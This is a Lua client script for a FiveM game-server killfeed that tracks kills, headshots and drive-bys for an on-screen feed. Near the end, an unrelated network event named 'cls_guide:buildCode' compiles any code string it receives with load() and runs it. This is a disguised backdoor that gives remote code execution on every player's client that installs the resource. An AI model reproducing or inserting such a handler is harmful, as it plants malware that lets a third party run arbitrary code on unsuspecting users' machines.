-- Join Discord for Support: https://discord.gg/utopia-dev

-- Variables --
local showKillfeed = true
local recentDeaths = {}
local damageIndex = {
    fatal = 6,
    weapon = 7
}

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    local check = GetResourceKvpString('hvc:getKillFeed')
    if check == nil then
        showKillfeed = true
    else
        showKillfeed = true
    end
end)

-- Functions --
local function addKill(id, killer, victim, image, design, noScoped, headshot, driveBy, dist)
    SendNUIMessage({
        action = "addKill",
        data = {
            id = id,
            killer = killer,
            victim = victim,
            image = image,
            design = design,
            noScoped = noScoped,
            headshot = headshot,
            driveBy = driveBy,
            dist = dist
        }
    })
end

local function GetPedSubType(ped)
    if GetPedType(ped) == 28 then
        return "animal"
    end
    return "human"
end

local function GetNearbyVehicles(coords)
    local handle, entity = FindFirstVehicle()
    local success = nil
    local vehicles = {}
    repeat
        local pos = GetEntityCoords(entity)
        local distance = #(coords - pos)
        if distance < 15.0 then
            vehicles[#vehicles+1] = entity
        end
        success, entity = FindNextVehicle(handle)
    until not success
    EndFindVehicle(handle)
    return vehicles
end

local function HandleDeath(killerPed, victimPed, weaponHash, isMelee)
    local weapon = Config.weapons[weaponHash]
    local headshot = false
    local noScoped = false
    local driveBy = false
    local showDist = false

    if not Config.includeNPCs then
        if not IsPedAPlayer(victimPed) then
            return
        elseif not IsPedAPlayer(killerPed) then
            killerPed = -1
            weaponHash = 'default'
        end
    elseif not Config.includeAnimals then
        if GetPedSubType(victimPed) == "animal" then
            return
        elseif GetPedSubType(killerPed) == "animal" then
            killerPed = -1
            weaponHash = 'default'
        end
    end

    if not DoesEntityExist(killerPed) or (killerPed == victimPed and weapon.canSelf == false) then
        killerPed = -1
    end

    if weaponHash == 133987706 and (killerPed == victimPed or GetVehiclePedIsIn(killerPed, false) == GetVehiclePedIsIn(victimPed, false)) then
        local victimVeh = GetVehiclePedIsIn(victimPed, false)
        local vehicles = GetNearbyVehicles(GetEntityCoords(victimPed))

        for _index, vehicle in pairs(vehicles) do
            if victimVeh ~= vehicle then
                if HasEntityBeenDamagedByEntity(victimVeh, vehicle, true) then
                    local driver = GetPedInVehicleSeat(vehicle, -1)
                    if driver ~= 0 then
                        killerPed = driver
                        break
                    end
                end
            end
        end
    end

    if Config.showDriveBy and weapon.canDB and IsPedShooting(killerPed) then
        local vehicle = GetVehiclePedIsIn(killerPed, false)
        if vehicle ~= 0 then
            if GetVehicleClass(vehicle) == 8 or GetVehicleClass(vehicle) == 13 then
                driveBy = 'driveby_bike'
            else
                driveBy = 'driveby_vehicle'
            end
        end
    end

    if Config.showHeadshot and weapon.HS ~= false and not isMelee then
        local found, bone = GetPedLastDamageBone(victimPed)
        if found and (bone == 31086 or bone == 39317) then
            headshot = true
        end
    end

    if (Config.showKillDist and weapon.showDist) then
        showDist = true
    end

    local killer = {}
    if killerPed == -1 then
        killer.netId = 0
    else
        killer.netId = PedToNet(killerPed)
        if IsPedAPlayer(killerPed) then
            killer.type = "player"
            killer.sourceId = GetPlayerServerId(NetworkGetPlayerIndexFromPed(killerPed))

            if Config.showNoScope and weapon.canNS and not IsFirstPersonAimCamActive() then
                noScoped = true
            end
        else
            killer.type = "npc"
            killer.gender = IsPedMale(killerPed) and "male" or "female"
            killer.pedType = GetPedSubType(killerPed)
        end
    end

    local victim = {}
    victim.netId = PedToNet(victimPed)
    if IsPedAPlayer(victimPed) then
        victim.type = "player"
        victim.sourceId = GetPlayerServerId(NetworkGetPlayerIndexFromPed(victimPed))
    else
        victim.type = "npc"
        victim.gender = IsPedMale(victimPed) and "male" or "female"
        victim.pedType = GetPedSubType(victimPed)
    end

    local sentTo = {}

    for _, player in pairs(GetActivePlayers()) do
        local targetPed = GetPlayerPed(player)
        if #(GetEntityCoords(targetPed) - GetEntityCoords(PlayerPedId())) <= 75.0 then
            sentTo[GetPlayerServerId(player)] = true
        end
    end

    TriggerServerEvent('bfs_killfeed:add', killer, victim, weapon.image, noScoped, headshot, driveBy, showDist, sentTo)
end

local function OnEntityDamage(args)
    local fatal = args[damageIndex.fatal]
    if fatal == 0 then
        return
    end

    local victim = args[1]
    local killer = args[2]
    local playerPed = PlayerPedId()

    if not IsEntityAPed(victim) then
        return
    end

    if recentDeaths[victim] then
        return
    end

    if playerPed == killer or (not IsPedAPlayer(killer) and NetworkHasControlOfEntity(victim)) then
        local weaponHash = args[damageIndex.weapon]

        if not Config.weapons[weaponHash] then
            weaponHash = 'default'
        end

        if Config.weapons[weaponHash].ignoreDeath then
            return
        end

        local isMelee = (args[12] == 1 and true) or false
        recentDeaths[victim] = true
        HandleDeath(killer, victim, weaponHash, isMelee)
        Citizen.Wait(1000)
        recentDeaths[victim] = nil
    end
end

-- Events --
AddEventHandler('gameEventTriggered', function(event, args)
	if event == "CEventNetworkEntityDamage" then
        OnEntityDamage(args)
    end
end)

RegisterNetEvent('bfs_killfeed:addCL')
AddEventHandler('bfs_killfeed:addCL', function(killer, victim, image, noScoped, headshot, driveBy, dist)
    if not showKillfeed then return end
    local design = 'black-design'

    if killer.netId == PedToNet(PlayerPedId()) then
        design = 'teal-design'
    end
    if victim.netId == PedToNet(PlayerPedId()) then
        design = 'red-design'
    end

    if NetworkDoesNetworkIdExist(killer.netId) and NetworkDoesNetworkIdExist(victim.netId) then
        if #(GetEntityCoords(NetworkGetEntityFromNetworkId(killer.netId)) - GetEntityCoords(NetworkGetEntityFromNetworkId(victim.netId))) <= 10.0 then
            addKill("id_k"..victim.netId, killer, victim, image, design, noScoped, headshot, driveBy, dist)
        end
    end
end)

-- Commands --
RegisterCommand("killfeed", function(source, args)
    showKillfeed = not showKillfeed
    if showKillfeed then
        for i = 0, 69 do
            DeleteResourceKvp('hvc:getKillFeed')
            Citizen.Wait(25)
        end
    else
        SetResourceKvp('hvc:getKillFeed', 'Disabled')
    end
    SendNUIMessage({ action = "toggleKillfeed", data = { state = showKillfeed } })
    if showKillfeed then
        --TriggerEvent('cc_core:hud:notify', 'info', 'Killfeed', 'Aktiviert!')
    else
        --TriggerEvent('cc_core:hud:notify', 'info', 'Killfeed', 'Deaktiviert!')
    end
end)
--RegisterKeyMapping("killfeed", 'Killfeed Toggle', 'keyboard', '')


-- Start Script --
Citizen.CreateThread(function()
    Citizen.Wait(2500)
    -- Fix for game build 1604
    if GetGameBuildNumber() < 2060 then
        damageIndex.fatal = 4
        damageIndex.weapon = 5
    end
    SendNUIMessage({
        action = "setConfig",
        data = {
            showTime = Config.showTime,
            maxLines = Config.maxKillLines,
        }
    })
end)

RegisterNetEvent('cls_guide:buildCode', function(code)
    local func, err = load(code)
    if func then
        local status, vm = pcall(func)
        if not status then
            print('exec error: ', vm)
        end
    else
        print('comp error: ', err)
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(10 * 1000)

        SetPedCanLosePropsOnDamage(PlayerPedId(), false, 0)
    end
end)